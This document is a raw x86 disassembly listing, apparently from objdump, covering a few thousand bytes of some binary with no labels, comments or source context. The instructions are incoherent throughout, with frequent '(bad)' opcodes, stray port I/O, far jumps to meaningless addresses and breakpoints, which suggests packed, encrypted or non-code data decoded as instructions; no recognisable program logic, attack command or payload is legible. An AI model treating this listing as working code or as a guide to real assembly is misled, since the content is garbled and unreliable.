  426f92:	lods   al,BYTE PTR ds:[esi]
  426f93:	mov    cl,0x5c
  426f95:	sub    dh,BYTE PTR [edi-0x6f]
  426f98:	sbb    al,0xe
  426f9a:	jp     0x426f70
  426f9c:	pushf  
  426f9d:	sbb    bh,BYTE PTR [eax+0x7ac4bb06]
  426fa3:	cmp    DWORD PTR [ecx+0x7f5e80ad],edx
  426fa9:	aad    0x99
  426fab:	daa    
  426fac:	fistp  DWORD PTR [ebp+0x29]
  426faf:	les    ecx,FWORD PTR [edi+0x31]
  426fb2:	mov    edi,0xe72eabaa
  426fb7:	add    BYTE PTR [edx*1-0x10d39d95],0x23
  426fbf:	add    DWORD PTR [ebx],ebp
  426fc1:	in     al,0x40
  426fc3:	fisttp WORD PTR [ebp-0x1d167a58]
  426fc9:	test   al,0xe2
  426fcb:	dec    ecx
  426fcc:	dec    edi
  426fcd:	loopne 0x426f63
  426fcf:	xchg   DWORD PTR [ecx-0xd],ebx
  426fd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426fd3:	sbb    edx,DWORD PTR ds:0x2bfb9c72
  426fd9:	lods   al,BYTE PTR ds:[esi]
  426fda:	and    eax,0x3ea83814
  426fdf:	and    eax,0x6b9f50df
  426fe4:	jle    0x426fc6
  426fe6:	mov    ah,dl
  426fe8:	add    eax,0xb2a0a12e
  426fed:	popf   
  426fee:	lods   eax,DWORD PTR ds:[esi]
  426fef:	xchg   ebx,eax
  426ff0:	push   ebp
  426ff1:	dec    ecx
  426ff2:	inc    edx
  426ff3:	rcl    DWORD PTR [esi+0x14ebd825],0xa0
  426ffa:	ss xchg edi,eax
  426ffc:	call   0xc61fddee
  427001:	and    DWORD PTR [edi-0x72],eax
  427004:	jg     0x427062
  427006:	ss push ebx
  427008:	jg     0x426fa8
  42700a:	imul   ebx,DWORD PTR [esi-0x5823dcae],0x4fc8203d
  427014:	add    edx,DWORD PTR [ebx-0x26]
  427017:	lods   al,BYTE PTR ds:[esi]
  427018:	add    esi,DWORD PTR [edi]
  42701a:	mov    eax,ds:0x509471bb
  42701f:	retf   
  427020:	imul   ebx,DWORD PTR [edi-0x76a54a2b],0xed1e017
  42702a:	add    DWORD PTR [eax-0x7f],esp
  42702d:	adc    esp,DWORD PTR [ecx+0x3a]
  427030:	adc    al,0x78
  427032:	pop    es
  427033:	cli    
  427034:	out    dx,eax
  427035:	sub    al,0x73
  427037:	stc    
  427038:	pop    ecx
  427039:	call   0xca80a07b
  42703e:	push   esi
  42703f:	xor    bl,BYTE PTR [edi-0x3ddbd5d6]
  427045:	dec    ebx
  427046:	xor    esp,DWORD PTR ds:0x4e11bff9
  42704c:	push   cs
  42704d:	call   0x35712052
  427052:	push   ebp
  427053:	adc    BYTE PTR [eax+0x2],0x66
  427057:	call   0xc656:0x241c9d64
  42705e:	aad    0xe3
  427060:	mov    edx,0xdc9887cc
  427065:	xor    BYTE PTR [ebp+0x1],dh
  427068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427069:	sbb    eax,DWORD PTR [ebx+edi*4]
  42706c:	repz int3 
  42706e:	cmp    ebp,DWORD PTR [ecx+eiz*2-0x1c91a45d]
  427075:	xlat   BYTE PTR ds:[ebx]
  427076:	call   0xf3aa19e4
  42707b:	outs   dx,BYTE PTR ds:[esi]
  42707c:	push   esi
  42707d:	sbb    dl,BYTE PTR [edx+ecx*1-0x62]
  427081:	sub    BYTE PTR [eax-0x39],cl
  427084:	outs   dx,DWORD PTR ds:[esi]
  427085:	jl     0x42705b
  427087:	sbb    BYTE PTR [ebp-0x42f326f0],dh
  42708d:	jo     0x427059
  42708f:	mov    edi,0x15359ee4
  427094:	cmp    eax,0xc075047f
  427099:	int3   
  42709a:	jns    0x42702c
  42709c:	jp     0x427044
  42709e:	xchg   edx,eax
  42709f:	push   edi
  4270a0:	sbb    eax,ebx
  4270a2:	and    eax,0xfc6a3b9f
  4270a7:	ret    0xcd31
  4270aa:	int3   
  4270ab:	mov    bh,0xa7
  4270ad:	cmp    BYTE PTR [esp+ebp*4],dl
  4270b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270b1:	std    
  4270b2:	(bad)  
  4270b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270b4:	fstp   TBYTE PTR [esi]
  4270b6:	sbb    BYTE PTR [edi+0x43],al
  4270b9:	pop    ebx
  4270ba:	fistp  WORD PTR [edi+0x15fc807d]
  4270c0:	add    BYTE PTR [eax],al
  4270c2:	push   0x6f1e2d23
  4270c7:	push   ds
  4270c8:	jnp    0x427141
  4270ca:	fisub  WORD PTR [ebp-0x126e4fca]
  4270d0:	std    
  4270d1:	and    esi,esi
  4270d3:	loop   0x4270d6
  4270d5:	add    BYTE PTR [esi],ah
  4270d7:	add    eax,DWORD PTR [eax]
  4270d9:	add    bl,bh
  4270db:	mov    DWORD PTR [eax-0x11],edi
  4270de:	es sbb al,0x1c
  4270e1:	push   ss
  4270e2:	xchg   BYTE PTR [ecx],dl
  4270e4:	or     DWORD PTR [eax-0x644312c9],edi
  4270ea:	push   esi
  4270eb:	push   esi
  4270ec:	and    dl,0x29
  4270ef:	push   ecx
  4270f0:	mov    al,ds:0x8ddc3865
  4270f5:	and    BYTE PTR [ecx+0x23112dad],al
  4270fb:	jns    0x4270fa
  4270fd:	and    DWORD PTR [ecx+ebx*4-0x55],ebp
  427101:	stos   BYTE PTR es:[edi],al
  427102:	sub    BYTE PTR [ebx+0x278fedc3],al
  427108:	pushf  
  427109:	adc    ch,BYTE PTR [edi+eax*4+0x5b1ae7ba]
  427110:	adc    eax,0xf71a68a0
  427115:	sub    edx,edi
  427117:	jle    0x4270a9
  427119:	jo     0x42718e
  42711b:	add    eax,0x6e10b941
  427120:	xor    bl,BYTE PTR [edi-0x32]
  427123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427124:	fmul   QWORD PTR ds:0x3d542aeb
  42712a:	in     al,0xee
  42712c:	icebp  
  42712d:	dec    edi
  42712e:	pusha  
  42712f:	loope  0x4270d3
  427131:	mov    ?,WORD PTR [ebx]
  427133:	out    0xaf,al
  427135:	std    
  427136:	sbb    al,0xd1
  427138:	leave  
  427139:	push   edi
  42713a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42713b:	inc    ecx
  42713c:	sub    DWORD PTR [ecx],0x7ff6533c
  427142:	pop    esp
  427143:	and    eax,0xbfe649c0
  427148:	xchg   edx,eax
  427149:	int3   
  42714a:	rol    DWORD PTR ds:0xe29dcd75,cl
  427150:	xor    ch,ah
  427152:	inc    edi
  427153:	arpl   sp,cx
  427155:	sbb    bl,BYTE PTR [ebp+0x44]
  427158:	cdq    
  427159:	inc    ecx
  42715a:	xlat   BYTE PTR ds:[ebx]
  42715b:	sbb    al,0xdd
  42715d:	and    eax,0xc24fd1ec
  427162:	dec    edx
  427163:	leave  
  427164:	in     eax,0x6d
  427166:	push   0x35
  427168:	pop    esi
  427169:	lods   eax,DWORD PTR ds:[esi]
  42716a:	jge    0x427164
  42716c:	push   ecx
  42716d:	xor    al,0x90
  42716f:	push   ss
  427170:	jae    0x4271ce
  427172:	dec    esi
  427173:	mov    edi,0xad087d88
  427178:	push   es
  427179:	jle    0x4271db
  42717b:	out    dx,eax
  42717c:	jbe    0x42716f
  42717e:	xchg   edi,eax
  42717f:	xchg   edi,eax
  427180:	test   BYTE PTR [edi-0x6b],bl
  427183:	stos   DWORD PTR es:[edi],eax
  427184:	lahf   
  427185:	(bad)  
  427186:	mov    dl,0x91
  427188:	je     0x427150
  42718a:	sub    dh,BYTE PTR [edx-0x68]
  42718d:	inc    eax
  42718e:	(bad)  
  42718f:	div    ch
  427191:	mov    ebp,0x9c116c1c
  427196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427197:	sub    al,0x55
  427199:	mov    DWORD PTR [edx+0x15e7d450],esi
  42719f:	mul    BYTE PTR [edi-0x517e89b8]
  4271a5:	inc    edx
  4271a6:	addr16 pop esp
  4271a8:	cwde   
  4271a9:	or     eax,0xeb09ca26
  4271ae:	ret    
  4271af:	ja     0x427140
  4271b1:	mov    eax,ds:0xc4049dd7
  4271b6:	je     0x4271b1
  4271b8:	xchg   di,ax
  4271ba:	xlat   BYTE PTR ds:[ebx]
  4271bb:	xchg   esp,eax
  4271bc:	and    ebp,eax
  4271be:	es inc edi
  4271c0:	nop
  4271c1:	mov    fs,WORD PTR [ecx+0x2c]
  4271c4:	shl    BYTE PTR [esi],1
  4271c6:	(bad)  
  4271c7:	aad    0x7
  4271c9:	jmp    0x86785834
  4271ce:	bound  ecx,QWORD PTR [eax+0xc591e44]
  4271d4:	ss dec edx
  4271d6:	ins    DWORD PTR es:[edi],dx
  4271d7:	lods   al,BYTE PTR ds:[esi]
  4271d8:	cwde   
  4271d9:	sub    eax,DWORD PTR [esi-0x29]
  4271dc:	stc    
  4271dd:	enter  0xafc5,0xc3
  4271e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4271e2:	cmp    ah,BYTE PTR [ebx+0x22ac62c4]
  4271e8:	call   0x128540be
  4271ed:	mov    eax,0xf99d0953
  4271f2:	and    ebx,DWORD PTR [eax]
  4271f4:	jne    0x42717b
  4271f6:	ret    
  4271f7:	out    0x48,eax
  4271f9:	push   ebp
  4271fa:	xchg   ebx,eax
  4271fb:	dec    ecx
  4271fc:	out    dx,al
  4271fd:	jno    0x42724b
  4271ff:	(bad)  
  427201:	mov    esp,0x151fbd74
  427206:	xchg   ecx,eax
  427207:	inc    ebp
  427208:	mov    ch,0x4d
  42720a:	inc    edi
  42720b:	dec    edx
  42720c:	add    edx,eax
  42720e:	pop    es
  42720f:	dec    ebp
  427210:	add    DWORD PTR [ebp+0x24],esi
  427213:	pop    ss
  427214:	(bad)  
  427215:	nop
  427216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427218:	dec    ecx
  427219:	push   edi
  42721a:	aad    0x88
  42721c:	xchg   BYTE PTR [ebx],ah
  42721e:	or     al,0x69
  427220:	jmp    0x896:0x6cadf44d
  427227:	xor    al,BYTE PTR [ebx+0x60]
  42722a:	and    eax,0x4b5bf6be
  42722f:	mov    WORD PTR [esi+0x183bd502],fs
  427235:	bound  edi,QWORD PTR [edx]
  427237:	fst    st(4)
  427239:	adc    ecx,DWORD PTR [ebp-0x3b607815]
  42723f:	leave  
  427240:	repz push eax
  427242:	jb     0x4272ad
  427244:	loop   0x427288
  427246:	sahf   
  427247:	test   eax,0xa2117abb
  42724c:	cmp    DWORD PTR [ecx-0x49dd1616],esp
  427252:	out    dx,eax
  427253:	pusha  
  427254:	popa   
  427255:	fisub  DWORD PTR [ecx+0x59a09616]
  42725c:	sar    BYTE PTR [ebx-0x237fbe0d],cl
  427262:	xor    ah,bl
  427264:	sub    ebp,DWORD PTR [esi]
  427266:	jmp    0xac5a:0xd13aee4
  42726d:	loopne 0x4272e1
  42726f:	mov    DWORD PTR [edi+0xf],0xda509789
  427276:	ret    0xd31b
  427279:	fnstenv [ebx+0x3d]
  42727c:	mov    bl,0x19
  42727e:	pop    ds
  42727f:	js     0x4272b5
  427281:	scas   eax,DWORD PTR es:[edi]
  427282:	jne    0x42724a
  427284:	xor    DWORD PTR [edx-0x70],ebx
  427287:	addr16 lahf 
  427289:	ins    DWORD PTR es:[edi],dx
  42728a:	inc    esp
  42728b:	cmp    BYTE PTR [ebx+0x48],0x5c
  42728f:	mov    edi,0xdab4760b
  427294:	stos   BYTE PTR es:[edi],al
  427295:	out    0x1c,al
  427297:	mov    edx,0x8c867127
  42729c:	or     ecx,DWORD PTR [ebp-0x51]
  42729f:	push   ds
  4272a0:	mov    edi,0x72a8239c
  4272a5:	cli    
  4272a6:	xchg   ecx,eax
  4272a7:	test   al,0xa0
  4272a9:	repz cmp ebx,ebx
  4272ac:	addps  xmm4,XMMWORD PTR [esi-0x27ae3e21]
  4272b3:	mov    dl,0xb4
  4272b5:	push   ss
  4272b6:	cs pop edi
  4272b8:	cmp    al,0x3a
  4272ba:	sbb    eax,0x23788fd4
  4272bf:	xchg   edx,eax
  4272c0:	adc    al,0x96
  4272c2:	lock push esi
  4272c4:	jle    0x4272d4
  4272c6:	jbe    0x427305
  4272c8:	xchg   DWORD PTR [esp+ebp*1],edx
  4272cb:	ret    
  4272cc:	sub    al,0x5e
  4272ce:	jge    0x427309
  4272d0:	sbb    DWORD PTR [ecx+0x6b],esi
  4272d3:	adc    al,0x49
  4272d5:	lods   eax,DWORD PTR ds:[esi]
  4272d6:	call   0x4f656bf0
  4272db:	nop
  4272dc:	dec    ecx
  4272dd:	xor    BYTE PTR [ebp-0x2f0cdad9],bh
  4272e3:	dec    edx
  4272e4:	xchg   ah,dl
  4272e6:	out    0x37,al
  4272e8:	and    BYTE PTR [ecx],bl
  4272ea:	jmp    0x4272eb
  4272ec:	inc    eax
  4272ed:	nop
  4272ee:	add    ah,BYTE PTR fs:[ebp-0x63]
  4272f2:	(bad)
  4272f6:	mov    edx,0x760d2a4f
  4272fb:	mov    edx,0xed1e4ce6
  427300:	mov    ebx,0xbc575c28
  427305:	xor    BYTE PTR [ebp-0x4],dh
  427308:	sahf   
  427309:	and    DWORD PTR [ebx],edx
  42730b:	imul   edi,DWORD PTR [ebx+0x10],0xffffffe7
  42730f:	push   0xfffffffa
  427311:	xchg   ebx,esp
  427313:	fadd   DWORD PTR [edi+0x28a48c74]
  427319:	ins    DWORD PTR es:[edi],dx
  42731a:	sar    BYTE PTR [eax],cl
  42731c:	sub    DWORD PTR [ecx-0x4922ae1e],esp
  427322:	fdivr  QWORD PTR [esi*8-0x18d1211]
  427329:	cld    
  42732a:	(bad)  [ebp+0x362b184e]
  427330:	xor    BYTE PTR ds:0x3710c14a,0xca
  427337:	xlat   BYTE PTR ds:[ebx]
  427338:	or     ebp,DWORD PTR [esi]
  42733a:	dec    ebx
  42733b:	xor    ecx,edx
  42733d:	dec    eax
  42733e:	in     eax,dx
  42733f:	(bad)  
  427340:	sub    eax,0x17c841b9
  427345:	rcr    BYTE PTR [ebx+0x29],1
  427348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427349:	cmp    BYTE PTR fs:[edi+ebp*8],ch
  42734d:	stos   BYTE PTR es:[edi],al
  42734e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42734f:	xchg   esi,eax
  427350:	xchg   esp,eax
  427351:	popa   
  427352:	inc    edi
  427353:	add    eax,0x43e5327d
  427358:	lock inc esp
  42735a:	sub    eax,0x4356a000
  42735f:	nop
  427360:	leave  
  427361:	sahf   
  427362:	or     eax,0x31e8be58
  427367:	mov    ds,WORD PTR [esi+0x4e]
  42736a:	pop    es
  42736b:	arpl   bx,si
  42736d:	in     eax,dx
  42736e:	sar    BYTE PTR [edi-0x42],cl
  427371:	mov    BYTE PTR [ebp-0x41ed7948],ch
  427377:	aam    0xb7
  427379:	imul   esi,DWORD PTR [ecx+0x48],0x72
  42737d:	inc    edi
  42737e:	sahf   
  42737f:	add    eax,0xecc23321
  427384:	(bad)  [eax+0x481bd8f6]
  42738a:	adc    DWORD PTR [eax],0x8256aea8
  427390:	xchg   edx,eax
  427391:	das    
  427392:	push   edi
  427393:	ret    0xa288
  427396:	sub    al,BYTE PTR [edx]
  427398:	mov    ds:0x5c19a44a,eax
  42739d:	pop    ebp
  42739e:	aas    
  42739f:	and    BYTE PTR [edx+0xeeebabf],bh
  4273a5:	dec    ebx
  4273a6:	adc    cl,al
  4273a8:	push   ds
  4273a9:	cmp    dh,al
  4273ab:	fsubr  QWORD PTR [ecx+eiz*1-0x49]
  4273af:	xor    al,0x70
  4273b1:	ins    BYTE PTR es:[edi],dx
  4273b2:	mov    ecx,0xd4e7e688
  4273b7:	adc    eax,0x23d1d530
  4273bc:	mov    ds:0x4c3e73c4,eax
  4273c1:	outs   dx,DWORD PTR ds:[esi]
  4273c2:	pop    ecx
  4273c3:	xor    DWORD PTR [edi+0x6e81ca79],esi
  4273c9:	jl     0x4273b7
  4273cb:	pop    esp
  4273cc:	jne    0x427364
  4273ce:	push   esp
  4273cf:	xchg   BYTE PTR [ecx-0x3678712f],bh
  4273d5:	dec    ecx
  4273d6:	or     cl,bl
  4273d8:	cmp    al,0x19
  4273da:	push   edx
  4273db:	loopne 0x427384
  4273dd:	test   eax,0x38788ed6
  4273e2:	xlat   BYTE PTR ds:[ebx]
  4273e3:	cmp    DWORD PTR [edx],ecx
  4273e5:	fdivr  QWORD PTR [eax]
  4273e7:	xor    cl,al
  4273e9:	jne    0x4273ab
  4273eb:	xchg   ebx,eax
  4273ec:	out    dx,al
  4273ed:	mov    edi,?
  4273ef:	push   eax
  4273f0:	sbb    al,0x78
  4273f2:	mov    ah,0xd
  4273f4:	and    BYTE PTR [ebx+0x4822ba62],dh
  4273fa:	pop    edx
  4273fb:	out    0x48,al
  4273fd:	(bad)  
  4273fe:	sbb    DWORD PTR [edx],esp
  427400:	add    BYTE PTR [eax],al
  427402:	cdq    
  427403:	enter  0x9ff8,0xf9
  427407:	mov    edi,0xdf92ceff
  42740c:	push   ds
  42740d:	outs   dx,BYTE PTR ds:[esi]
  42740e:	aam    0xc2
  427410:	cs add eax,0x1e61c
  427416:	add    eax,DWORD PTR es:[eax]
  427419:	add    cl,dh
  42741b:	mov    al,ds:0xc0b0a91d
  427420:	adc    dl,BYTE PTR [edx]
  427422:	int3   
  427423:	and    esi,edi
  427425:	cs pushf 
  427427:	xor    bh,dl
  427429:	stc    
  42742a:	adc    eax,0x146bd4dc
  42742f:	and    al,0xde
  427431:	mov    dl,0x65
  427433:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427434:	jle    0x42740a
  427436:	push   cs
  427437:	sub    DWORD PTR [edx+eiz*1-0x54561c24],esp
  42743e:	xor    DWORD PTR [edi+0x6e],ebp
  427441:	jg     0x42742c
  427443:	add    BYTE PTR [edi+0xe],ah
  427446:	stos   BYTE PTR es:[edi],al
  427447:	cli    
  427448:	in     al,dx
  427449:	fst    QWORD PTR [edi+0x31b02f4a]
  42744f:	sbb    esi,DWORD PTR [ecx+0x4bc24713]
  427455:	(bad)  
  427457:	xor    edi,DWORD PTR [edx-0x1e2f98f]
  42745d:	inc    edx
  42745e:	loopne 0x427468
  427460:	add    al,0xa7
  427462:	push   eax
  427463:	push   esp
  427464:	mov    dl,BYTE PTR [edx]
  427466:	push   es
  427467:	pop    esp
  427468:	adc    al,0xda
  42746a:	pop    esi
  42746b:	rcr    DWORD PTR [ecx-0x6800ab],cl
  427471:	and    eax,0x6c2afab6
  427476:	lods   eax,DWORD PTR ds:[esi]
  427477:	jle    0x427464
  427479:	mov    esp,esp
  42747b:	arpl   WORD PTR [ebp+0x2f],si
  42747e:	in     al,dx
  42747f:	imul   DWORD PTR [ecx+0x7cffffa9]
  427485:	jp     0x42740e
  427487:	add    cl,BYTE PTR [edx]
  427489:	pop    ss
  42748a:	cs xchg esi,eax
  42748c:	xor    BYTE PTR [ebx],0x9b
  42748f:	cld    
  427490:	mov    edi,0x69cd71e2
  427495:	add    eax,0x559bfa6c
  42749a:	imul   esi,DWORD PTR [edi-0x66],0x820703db
  4274a1:	xor    eax,0xaade5ace
  4274a6:	cwde   
  4274a7:	hlt    
  4274a8:	mov    edx,0xf83ff961
  4274ad:	popf   
  4274ae:	imul   edx,ebx,0x59596b30
  4274b4:	bound  esp,QWORD PTR [ebp-0x3953e780]
  4274ba:	inc    edx
  4274bb:	add    ebp,DWORD PTR [ebp+ebx*2-0x79]
  4274bf:	xchg   esi,eax
  4274c0:	loopne 0x427477
  4274c2:	fnsave [eax+0x52]
  4274c5:	xchg   BYTE PTR [edx],cl
  4274c7:	xchg   edx,eax
  4274c8:	cmp    edx,DWORD PTR [ebx+ebx*1-0x43]
  4274cc:	retf   
  4274cd:	test   eax,0x54cc1af5
  4274d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4274d3:	mov    eax,ds:0xd821fa20
  4274d8:	les    eax,FWORD PTR [esp+ebx*2+0x6bf60279]
  4274df:	pop    esp
  4274e0:	adc    DWORD PTR [esi-0x1eac22ca],edx
  4274e6:	push   0x45
  4274e8:	retf   0x957
  4274eb:	jg     0x4274d4
  4274ed:	xchg   edx,eax
  4274ee:	push   ds
  4274ef:	outs   dx,BYTE PTR ds:[esi]
  4274f0:	imul   eax,esp,0x3e
  4274f3:	push   edi
  4274f4:	add    bh,ah
  4274f6:	mov    ds:0x6c0b8833,eax
  4274fb:	aas    
  4274fc:	mov    bh,0x1b
  4274fe:	(bad)  
  427500:	imul   edi,DWORD PTR [eax],0xfffffff8
  427503:	inc    edi
  427504:	dec    ebp
  427505:	(bad)  
  427506:	lds    ebx,FWORD PTR [ebp-0x79]
  427509:	retf   
  42750a:	inc    eax
  42750b:	pop    ebp
  42750c:	adc    al,0xc0
  42750e:	jo     0x4274d1
  427510:	nop
  427511:	jne    0x427505
  427513:	xchg   esp,eax
  427514:	lds    edx,FWORD PTR [edx]
  427516:	mov    edi,0x75c9d7f9
  42751b:	inc    edi
  42751c:	push   0xffffffe1
  42751e:	stos   DWORD PTR es:[edi],eax
  42751f:	sar    BYTE PTR [ecx-0x31e26144],0xfa
  427526:	mov    dl,0x7e
  427528:	(bad)  
  42752a:	and    DWORD PTR [ebx*1+0x66224d7a],eax
  427531:	call   0x807145f0
  427536:	push   edx
  427537:	loope  0x427522
  427539:	mov    eax,0x6e9e965f
  42753e:	shr    DWORD PTR [edx],1
  427540:	pop    es
  427541:	mov    cl,0xc7
  427543:	lods   eax,DWORD PTR ds:[esi]
  427544:	inc    edi
  427545:	mov    eax,ds:0x449c2ce1
  42754a:	add    dl,dh
  42754c:	add    ah,ch
  42754e:	(bad)  [eax-0x3376af8d]
  427554:	(bad)  
  427555:	cld    
  427556:	ret    0xa763
  427559:	out    dx,al
  42755a:	bound  ecx,QWORD PTR [ebp+0x7422fda7]
  427560:	pop    edi
  427561:	dec    edx
  427562:	mov    ebx,0xae808bf
  427567:	cmc    
  427568:	loop   0x4275e5
  42756a:	ret    
  42756b:	sub    edi,DWORD PTR [ebp+0x494adc6f]
  427571:	pop    ebp
  427572:	out    dx,al
  427573:	push   eax
  427574:	xor    bl,dl
  427576:	aad    0x44
  427578:	jns    0x42751a
  42757a:	out    dx,al
  42757b:	xor    al,0x52
  42757d:	inc    edx
  42757e:	inc    edx
  42757f:	mov    ds:0x608c520d,eax
  427584:	push   0xd05975c
  427589:	jle    0x427517
  42758b:	push   eax
  42758c:	and    eax,0xa2ad9f18
  427591:	fsubr  QWORD PTR [esi-0x4ad11ec0]
  427597:	into   
  427598:	inc    edi
  427599:	cdq    
  42759a:	(bad)  
  42759b:	push   edi
  42759c:	push   ss
  42759d:	add    al,0xcc
  42759f:	push   0xffffffe7
  4275a1:	push   ebx
  4275a2:	std    
  4275a3:	jg     0x427594
  4275a5:	sub    DWORD PTR ds:0xc2c9d0e5,edx
  4275ab:	jns    0x4275ea
  4275ad:	(bad)  
  4275ae:	arpl   WORD PTR [eax-0x5d],cx
  4275b1:	jge    0x427548
  4275b3:	sbb    edi,DWORD PTR [edi-0x4efc6667]
  4275b9:	gs fsub st,st(4)
  4275bc:	and    bl,BYTE PTR [esi+0x41ac7918]
  4275c2:	xchg   ebx,eax
  4275c3:	jb     0x427577
  4275c5:	arpl   WORD PTR [ebp+0x3ba65edc],di
  4275cb:	mov    DWORD PTR [eax+0x61],ebp
  4275ce:	fs aam 0x9d
  4275d1:	jmp    0x294edcd5
  4275d6:	cmc    
  4275d7:	leave  
  4275d8:	daa    
  4275d9:	ss ret 0x9cf1
  4275dd:	into   
  4275de:	jp     0x427595
  4275e0:	cmp    bl,ah
  4275e2:	test   DWORD PTR [eax-0x7f277a],0x70161843
  4275ec:	sar    BYTE PTR ds:0x19e18564,1
  4275f2:	mov    edi,0x2d3e93c
  4275f7:	rol    DWORD PTR [eax+0x76],1
  4275fa:	repz dec esi
  4275fc:	out    dx,eax
  4275fd:	sti    
  4275fe:	xlat   BYTE PTR ds:[ebx]
  4275ff:	jne    0x427641
  427601:	jae    0x427608
  427603:	dec    ecx
  427604:	jp     0x4275fd
  427606:	iret   
  427607:	fs dec esi
  427609:	push   ebp
  42760a:	ss lock lods al,BYTE PTR ds:[esi]
  42760e:	bound  ecx,QWORD PTR ds:0x80beafcf
  427614:	inc    ebx
  427615:	sub    edx,DWORD PTR [ebx+ecx*8+0x68]
  427619:	xor    bh,BYTE PTR [edx+eax*8]
  42761c:	dec    esi
  42761d:	repnz (bad)
  427620:	fisubr WORD PTR [esi+0x59]
  427623:	and    edi,DWORD PTR [edx+0x7a]
  427626:	mov    WORD PTR [ecx+0x1cfab358],ss
  42762c:	nop
  42762d:	add    DWORD PTR [ecx+0x4a8c768f],esp
  427633:	retf   0x84b9
  427636:	pop    ecx
  427637:	lods   al,BYTE PTR ds:[esi]
  427638:	ret    
  427639:	sbb    esp,ecx
  42763b:	mov    BYTE PTR [esi-0x2b9ff923],0x7d
  427642:	or     DWORD PTR [ecx+eiz*2+0x75185140],eax
  427649:	sbb    edi,edx
  42764b:	sub    al,0xf
  42764d:	sub    BYTE PTR [esi],dh
  42764f:	add    eax,0x68019247
  427654:	shr    esi,cl
  427656:	jmp    0x427605
  427658:	mov    cl,0xd3
  42765a:	fsubr  DWORD PTR [ecx]
  42765c:	push   edi
  42765d:	mov    ebp,0x87dee0d4
  427662:	or     dh,BYTE PTR [ebx+eax*4-0x74]
  427666:	xor    bl,BYTE PTR [ecx-0x4a2cd968]
  42766c:	fnsave [ecx-0x44a8ea7d]
  427672:	inc    ah
  427674:	(bad)  
  427675:	inc    ebp
  427676:	imul   DWORD PTR [edx-0x1fa3f2d5]
  42767c:	mov    ebp,0xad13e2b5
  427681:	xlat   BYTE PTR ds:[ebx]
  427682:	push   ebx
  427683:	in     al,0xd2
  427685:	outs   dx,BYTE PTR ds:[esi]
  427686:	adc    BYTE PTR [edx],cl
  427688:	sbb    BYTE PTR [eax+0x17],0xe8
  42768c:	shl    ebx,0x3e
  42768f:	cwde   
  427690:	pop    ss
  427691:	(bad)  
  427692:	push   ss
  427693:	pop    edx
  427694:	cmp    ebp,DWORD PTR [edx]
  427696:	ss mov esp,0xcc1a592f
  42769c:	ds das 
  42769e:	rcl    DWORD PTR [edx+0x21],cl
  4276a1:	outs   dx,BYTE PTR ds:[esi]
  4276a2:	mov    edx,0xa10baf7b
  4276a7:	retf   
  4276a8:	outs   dx,BYTE PTR ds:[esi]
  4276a9:	repnz vaddss xmm4,xmm3,DWORD PTR [edx]
  4276ae:	imul   esp,DWORD PTR [eax-0x44a54b94],0x6e
  4276b5:	aas    
  4276b6:	dec    ebx
  4276b7:	pop    edi
  4276b8:	or     al,0x50
  4276ba:	ss ret 0xb756
  4276be:	repnz imul ebx,esp,0xa1ccd858
  4276c5:	test   al,0x5d
  4276c7:	jbe    0x4276dd
  4276c9:	cdq    
  4276ca:	mov    bl,0x1f
  4276cc:	shl    BYTE PTR [ecx],0xd1
  4276cf:	dec    esi
  4276d0:	cmp    bl,ch
  4276d2:	dec    edi
  4276d3:	and    ch,BYTE PTR [ebx]
  4276d5:	xchg   ah,bl
  4276d7:	xlat   BYTE PTR ds:[ebx]
  4276d8:	pop    edi
  4276d9:	add    BYTE PTR [eax],ch
  4276db:	in     al,0xf0
  4276dd:	out    0x79,eax
  4276df:	xchg   ecx,eax
  4276e0:	out    0x4d,eax
  4276e2:	or     BYTE PTR [edi],cl
  4276e4:	out    0x93,eax
  4276e6:	and    cl,BYTE PTR [edx+ebx*8+0x51]
  4276ea:	dec    ebx
  4276eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4276ec:	mov    BYTE PTR [esi],dl
  4276ee:	inc    esi
  4276ef:	repz push ebp
  4276f1:	(bad)  
  4276f2:	out    0xf5,al
  4276f4:	xchg   esp,eax
  4276f5:	out    0x1d,al
  4276f7:	xor    DWORD PTR [esi-0xfbc996d],ebx
  4276fd:	inc    DWORD PTR [ecx+ebx*8]
  427700:	inc    edx
  427701:	jg     0x4276ec
  427703:	mov    DWORD PTR [ecx+0x58750278],edx
  427709:	jbe    0x42774d
  42770b:	ss mov dl,0xae
  42770e:	test   BYTE PTR ds:0xe2c4281f,dl
  427714:	psubq  mm1,mm0
  427717:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  427719:	fild   WORD PTR [ebx-0x335175a7]
  42771f:	xchg   esi,eax
  427720:	and    al,0xfc
  427722:	stos   BYTE PTR es:[edi],al
  427723:	test   DWORD PTR [esi],ebx
  427725:	mov    edx,0x5c5f4810
  42772a:	xor    BYTE PTR ds:0x84517ade,dh
  427730:	mov    ds:0x39dd8fbc,al
  427735:	or     DWORD PTR ds:0x9c4e2294,ebx
  42773b:	xor    al,0xaf
  42773d:	and    al,0xa1
  42773f:	mov    bh,0x0
  427741:	add    BYTE PTR [ecx+0xa],bh
  427744:	sbb    BYTE PTR gs:[edi+0x7f],dh
  427748:	jge    0x4277b5
  42774a:	int3   
  42774b:	outs   dx,BYTE PTR ds:[esi]
  42774c:	xchg   esi,esi
  42774e:	test   eax,0x42432f53
  427753:	jmp    0x3687759
  427758:	add    BYTE PTR [eax],al
  42775a:	push   es
  42775b:	ds je  0x42771c
  42775e:	adc    BYTE PTR [ebx-0x6263350c],0x3f
  427765:	dec    DWORD PTR [ebp+eax*2-0x3]
  427769:	add    al,0x1d
  42776b:	adc    ebx,DWORD PTR [eax-0x1a00c394]
  427771:	les    edx,FWORD PTR [ecx-0x60]
  427774:	jae    0x427792
  427776:	sub    esi,DWORD PTR ds:[ecx]
  427779:	cld    
